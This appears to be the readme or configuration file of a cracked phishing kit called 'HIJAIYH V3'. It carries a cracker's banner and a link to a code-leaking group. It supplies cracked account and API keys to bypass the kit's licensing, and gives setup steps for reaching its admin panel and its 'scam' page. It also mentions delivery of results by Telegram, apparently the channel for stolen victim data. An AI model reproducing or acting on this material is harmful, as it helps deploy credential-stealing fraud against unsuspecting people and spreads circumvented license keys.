/*
    ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
    ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
    ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
    ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
    .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
    FuCked By [!]DNThirTeen
    https://www.facebook.com/groups/L34K.C0de/
*/

account_key = DNTHIRTEEN-KEY-L34KC0DE
api_key = DNTHIRTEEN-API-H34RTBL33D-L34KC0DE

########### HIJAIYH V3 ##########

* How to activate ?

# Input Api key and Account key.

* How i get api and account key?

# You must loggin in web hijaiyh official and get it.


-------------------------------------

Access panel : https://domain.com/panel

--------------------------------------
Access Scam : https://domain.com/?parameter ( default : https://domain.com/?iyh_re )

--------------------------------------

Note : Telegram result temporary unable.

Thanks for support us !